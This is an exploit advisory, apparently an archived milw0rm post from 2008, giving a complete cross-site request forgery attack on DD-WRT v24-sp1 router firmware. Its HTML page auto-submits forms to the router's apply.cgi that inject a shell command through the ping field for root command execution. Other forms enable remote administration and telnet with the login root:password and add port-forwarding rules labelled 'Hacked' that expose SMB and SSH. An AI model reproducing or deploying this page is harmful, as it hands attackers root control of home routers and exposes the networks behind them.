<html><head><title>DD-WRT v24-sp1 (XSRF) Cross Site Reference Forgery Exploit</title></head><pre>Remote root dd-wrt
--------------------------------------------------------------------------------

Written by Michael Brooks
Special thanks to str0ke

Exploits tested on the newist stable version:
Firmware: DD-WRT v24-sp1 (07/27/08) micro
Product Homepage:
http://dd-wrt.com/

Impact:
1)Remote root command execuiton /bin/sh
2)Change web administration password and enable remote admistration
3)create new Port Forwarding rules to byass NAT.

&lt;html&gt;
	&lt;head&gt;
		&lt;meta http-equiv=&quot;content-type&quot; content=&quot;text/html; charset=ISO-8859-1&quot;&gt;
	&lt;/head&gt;
	Remote root command execution /bin/sh
	&lt;form method=&quot;post&quot; action=&quot;http://192.168.1.1/apply.cgi&quot; id=1&gt;
		&lt;input name=&quot;submit_button&quot; value=&quot;Ping&quot; type=&quot;hidden&quot;&gt;
		&lt;input name=&quot;action&quot; value=&quot;ApplyTake&quot; type=&quot;hidden&quot;&gt;
		&lt;input name=&quot;submit_type&quot; value=&quot;start&quot; type=&quot;hidden&quot;&gt;
		&lt;input name=&quot;change_action&quot; value=&quot;gozila_cgi&quot; type=&quot;hidden&quot;&gt;
		&lt;input name=&quot;next_page&quot; value=&quot;Diagnostics.asp&quot; type=&quot;hidden&quot;&gt;
		&lt;input name=&quot;ping_ip&quot; value=&quot;echo owned&quot;&gt;
		&lt;input name=&quot;execute command&quot; type=&quot;submit&quot;&gt;
	&lt;/form&gt;&lt;br&gt;&lt;br&gt;	
	enable remote administration and change login to root:password
	&lt;form method=&quot;post&quot; action=&quot;http://192.168.1.1/apply.cgi&quot;&gt;
		&lt;input name=&quot;submit_button&quot; value=&quot;Management&quot; type=&quot;hidden&quot;&gt;
		&lt;input name=&quot;action&quot; value=&quot;ApplyTake&quot; type=&quot;hidden&quot;&gt;
		&lt;input name=&quot;change_action&quot; value=&quot;&quot; type=&quot;hidden&quot;&gt;
		&lt;input name=&quot;submit_type&quot; value=&quot;&quot; type=&quot;hidden&quot;&gt;
		&lt;input name=&quot;commit&quot; value=&quot;1&quot; type=&quot;hidden&quot;&gt;
		&lt;input name=&quot;PasswdModify&quot; value=&quot;0&quot; type=&quot;hidden&quot;&gt;
		&lt;input name=&quot;remote_mgt_https&quot; value=&quot;&quot; type=&quot;hidden&quot;&gt;
		&lt;input name=&quot;http_enable&quot; value=&quot;1&quot; type=&quot;hidden&quot;&gt;
		&lt;input name=&quot;info_passwd&quot; value=&quot;0&quot; type=&quot;hidden&quot;&gt;
		&lt;input name=&quot;https_enable&quot; value=&quot;&quot; type=&quot;hidden&quot;&gt;
		&lt;input name=&quot;http_username&quot; value=&quot;root&quot; type=&quot;hidden&quot;&gt;
		&lt;input name=&quot;http_passwd&quot; value=&quot;password&quot; type=&quot;hidden&quot;&gt;
		&lt;input name=&quot;http_passwdConfirm&quot; value=&quot;password&quot; type=&quot;hidden&quot;&gt;
		&lt;input name=&quot;_http_enable&quot; value=&quot;1&quot; type=&quot;hidden&quot;&gt;
		&lt;input name=&quot;refresh_time&quot; value=&quot;3&quot; type=&quot;hidden&quot;&gt;
		&lt;input name=&quot;status_auth&quot; value=&quot;1&quot; type=&quot;hidden&quot;&gt;
		&lt;input name=&quot;maskmac&quot; value=&quot;1&quot; type=&quot;hidden&quot;&gt;
		&lt;input name=&quot;remote_management&quot; value=&quot;1&quot; type=&quot;hidden&quot;&gt;
		&lt;input name=&quot;http_wanport&quot; value=&quot;8080&quot; type=&quot;hidden&quot;&gt;
		&lt;input name=&quot;remote_mgt_telnet&quot; value=&quot;1&quot; type=&quot;hidden&quot;&gt;
		&lt;input name=&quot;telnet_wanport&quot; value=&quot;23&quot; type=&quot;hidden&quot;&gt;
		&lt;input name=&quot;boot_wait&quot; value=&quot;on&quot; type=&quot;hidden&quot;&gt;
		&lt;input name=&quot;cron_enable&quot; value=&quot;1&quot; type=&quot;hidden&quot;&gt;
		&lt;input name=&quot;cron_jobs&quot; value=&quot;&quot; type=&quot;hidden&quot;&gt;
		&lt;input name=&quot;loopback_enable&quot; value=&quot;1&quot; type=&quot;hidden&quot;&gt;
		&lt;input name=&quot;nas_enable&quot; value=&quot;1&quot; type=&quot;hidden&quot;&gt;
		&lt;input name=&quot;resetbutton_enable&quot; value=&quot;1&quot; type=&quot;hidden&quot;&gt;
		&lt;input name=&quot;zebra_enable&quot; value=&quot;1&quot; type=&quot;hidden&quot;&gt;
		&lt;input name=&quot;ip_conntrack_max&quot; value=&quot;512&quot; type=&quot;hidden&quot;&gt;
		&lt;input name=&quot;ip_conntrack_tcp_timeouts&quot; value=&quot;3600&quot; type=&quot;hidden&quot;&gt;
		&lt;input name=&quot;ip_conntrack_udp_timeouts&quot; value=&quot;120&quot; type=&quot;hidden&quot;&gt;
		&lt;input name=&quot;overclocking&quot; value=&quot;200&quot; type=&quot;hidden&quot;&gt;
		&lt;input name=&quot;router_style&quot; value=&quot;yellow&quot; type=&quot;hidden&quot;&gt;
		&lt;input name=&quot;Remote Admin&quot; type=&quot;submit&quot;&gt;
	&lt;/form&gt;&lt;br&gt;&lt;br&gt;
	Change Port Forwarding to byass NAT protection.
	&lt;form method=&quot;post&quot; action=&quot;http://192.168.1.1/apply.cgi&quot;&gt;	
		&lt;input name=&quot;submit_button&quot; value=&quot;Change Port Forwarding&quot; type=&quot;submit&quot;&gt;
		&lt;input name=&quot;action&quot; value=&quot;ApplyTake&quot; type=&quot;hidden&quot;&gt;
		&lt;input name=&quot;change_action&quot; value=&quot;&quot; type=&quot;hidden&quot;&gt;
		&lt;input name=&quot;submit_type&quot; value=&quot;&quot; type=&quot;hidden&quot;&gt;
		&lt;input name=&quot;forward_spec&quot; value=&quot;13&quot; type=&quot;hidden&quot;&gt;
		&lt;input name=&quot;name0&quot; value=&quot;Hacked&quot; type=&quot;hidden&quot;&gt;
		&lt;input name=&quot;from0&quot; value=&quot;4450&quot; type=&quot;hidden&quot;&gt;
		&lt;input name=&quot;pro0&quot; value=&quot;both&quot; type=&quot;hidden&quot;&gt;
		&lt;input name=&quot;ip0&quot; value=&quot;192.168.1.100&quot; type=&quot;hidden&quot;&gt;
		&lt;input name=&quot;to0&quot; value=&quot;445&quot; type=&quot;hidden&quot;&gt;
		&lt;input name=&quot;enable0&quot; value=&quot;on&quot; type=&quot;hidden&quot;&gt;
		&lt;input name=&quot;name1&quot; value=&quot;Hacked Again&quot; type=&quot;hidden&quot;&gt;
		&lt;input name=&quot;from1&quot; value=&quot;22&quot; type=&quot;hidden&quot;&gt;
		&lt;input name=&quot;pro1&quot; value=&quot;tcp&quot; type=&quot;hidden&quot;&gt;
		&lt;input name=&quot;ip1&quot; value=&quot;192.168.1.101&quot; type=&quot;hidden&quot;&gt;
		&lt;input name=&quot;to1&quot; value=&quot;22&quot; type=&quot;hidden&quot;&gt;
		&lt;input name=&quot;enable1&quot; value=&quot;on&quot; type=&quot;hidden&quot;&gt;
	&lt;/form&gt;
&lt;/html&gt;
&lt;script&gt;
	document.getElementById(1).submit();//remote root command execution!
&lt;/script&gt;

# milw0rm.com [2008-12-08]</pre></html>